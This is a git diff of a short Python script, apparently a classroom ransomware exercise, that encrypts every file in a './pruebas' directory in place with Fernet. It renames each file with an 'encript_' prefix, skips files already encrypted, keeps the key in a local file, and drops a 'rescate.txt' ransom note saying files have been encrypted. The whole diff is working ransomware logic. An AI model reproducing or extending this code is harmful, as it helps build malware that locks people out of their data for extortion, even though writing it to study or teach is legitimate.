@@ -3,13 +3,17 @@ import os
 
 
 def generar_clave():
-    clave = Fernet.generate_key()
-    fichero_clave=open('clave.key','wb')
-    fichero_clave.write(clave)
-    fichero_clave.close()
+    if not os.path.isfile('clave.key'):
+        clave1 = Fernet.generate_key()
+        fichero_clave = open('clave.key', 'wb')
+        fichero_clave.write(clave1)
+        fichero_clave.close()
 
-def obtener_clave():
-    fichero=open('clave.key','rb')
+
+def obtener_clave(ruta = "clave.key"):
+    #fichero=open('clave.key','rb')
+    fichero=open(ruta,'rb')
+
     #DEVUELVE LA CLAVE
     return fichero.readline()
 
@@ -21,30 +25,36 @@ def ruta_absoluta(directorio):
             lista_directorios.append(os.path.abspath(os.path.join(ruta, a)))
     return lista_directorios
 
-def encriptar(rutas,clave):
-    f=Fernet(clave)
+def encriptar(rutas, clave1, ruta_principal):
+    f=Fernet(clave1)
+    elem_enciptados = False
     for elemento in rutas:
-        #OBTENEMOS EL CONTENIDO DEL FICHERO Y LO ENCRIPTAMOS
-        # → Abrimos el fichero en modo lectura-binario
-        # → Leemos el contenido (read) y lo encriptamos con el metodo encrypt de la clase Fernet
-        # → Guardamos el contenido encriptado en una variable que usaremos después para sobreescribir el contenido
-        # → Cerramos el fichero para poder abrirlo después en modo escritura
-        # → Añadimos un control para comprobar si tiene el prefijo “cifrado” para comprobar si ya está cifrado
-        fich = open(elemento,'rb')
-        contenido_encriptado = f.encrypt(fich.read())
-        fich.close()
-        #SOBREESCRIBIMOS EL CONTENIDO DE LOS FICHEROS POR EL CONTENIDO ENCRIPTADO
-        # → Abrimos fichero en modo escritura-binario
-        # → Escribimos el contenido encriptado que hemos obtenido previamente
-        # → Cerramos el fichero
-        fich = open(elemento,'wb')
-        fich.write(contenido_encriptado)
-        fich.close()
+        fich = open(elemento, 'rb')
+        ruta_segmentada = fich.name.split("/")
+        if not ruta_segmentada[-1].startswith("encript_"):
+            elem_enciptados = True
+            contenido_encriptado = f.encrypt(fich.read())
+            fich.close()
+
+            fich = open(elemento,'wb')
+            fich.write(contenido_encriptado)
+            fich.close()
+            nuevo_nombre = 'encript_' + ruta_segmentada[-1]
+            ruta_segmentada[-1] = nuevo_nombre
+            os.rename(fich.name, '/'.join(ruta_segmentada))
+        else:
+            fich.close()
+    if elem_enciptados:
+        fichero_rescate = open('rescate.txt', 'w')
+        fichero_rescate.write("Se han encriptado archivos!")
+        fichero_rescate.close()
+
 
 
 
 
 if __name__ == '__main__':
-    print(obtener_clave())
+    #print(obtener_clave())
+    clave = obtener_clave()
     lista_rutas = ruta_absoluta('./pruebas')
-    print(lista_rutas)
+    encriptar(lista_rutas, clave, './pruebas')
